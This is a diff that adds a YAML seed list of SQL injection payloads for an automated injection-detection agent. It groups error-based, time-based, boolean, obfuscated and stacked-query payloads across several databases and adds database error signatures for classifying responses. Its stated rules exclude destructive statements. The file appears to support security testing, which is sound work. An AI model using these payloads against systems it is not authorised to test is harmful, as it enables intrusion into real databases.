@@ -1,0 +1,78 @@
+# SQL injection payloads — seed list for the SQLi agent
+#
+# Safety rules (enforced by agent):
+#   - NO DROP, TRUNCATE, DELETE without WHERE, UPDATE without WHERE
+#   - NO long SLEEP values (max 5s)
+#   - Detection only: read-only SELECT, error triggers, boolean conditions
+
+payloads:
+  error_based:
+    - "'"
+    - "''"
+    - "' OR '1'='1"
+    - "' OR '1'='1'--"
+    - "' OR 1=1--"
+    - "\" OR \"1\"=\"1"
+    - "1 AND 1=1"
+    - "1 AND 1=2"
+    - "1' AND '1'='1"
+    - "1' AND '1'='2"
+    - "') OR ('1'='1"
+
+  time_based:
+    # MySQL
+    - "'; SELECT SLEEP(5)-- -"
+    - "' OR SLEEP(5)-- -"
+    - "1' AND SLEEP(5)-- -"
+    - "1 AND SLEEP(5)-- -"
+    # MSSQL
+    - "'; WAITFOR DELAY '0:0:5'-- -"
+    - "1; WAITFOR DELAY '0:0:5'-- -"
+    # PostgreSQL
+    - "'; SELECT pg_sleep(5)-- -"
+    - "1'; SELECT pg_sleep(5)-- -"
+    # SQLite (no native sleep — uses heavy query as approximation)
+    - "' AND (SELECT COUNT(*) FROM sqlite_master, sqlite_master m2, sqlite_master m3)>0 AND '1'='1"
+
+  boolean_based:
+    - "' AND 1=1-- -"
+    - "' AND 1=2-- -"
+    - "1 AND 1=1-- -"
+    - "1 AND 1=2-- -"
+    - "' AND 'x'='x"
+    - "' AND 'x'='y"
+
+  obfuscation:
+    - "' /*!OR*/ '1'='1"
+    - "'/**/OR/**/'1'='1"
+    - "' %4fR '1'='1"           # URL-encoded O
+    - "' O%52 '1'='1"           # URL-encoded R
+    - "1'%20AND%20'1'%3D'1"
+    - "1' AND 0x31=0x31-- -"
+
+  stacked:
+    # Only try if single-quote variant confirmed injectable
+    - "'; SELECT 1-- -"
+    - "1; SELECT 1-- -"
+
+# Detection signatures (used by agent to classify responses)
+error_signatures:
+  - "you have an error in your sql syntax"
+  - "unclosed quotation mark"
+  - "quoted string not properly terminated"
+  - "pg_query()"
+  - "ORA-"
+  - "Microsoft OLE DB Provider for SQL"
+  - "Syntax error.*SQL"
+  - "SQLiteException"
+  - "SQLITE_ERROR"
+  - "sql syntax.*near"
+  - "near.*syntax error"
+  - "warning.*mysql"
+  - "PSQLException"
+  - "com.mysql.jdbc"
+  - "org.postgresql"
+  - "System.Data.SqlClient"
+
+time_threshold_ms: 4500
+max_sleep_seconds: 5
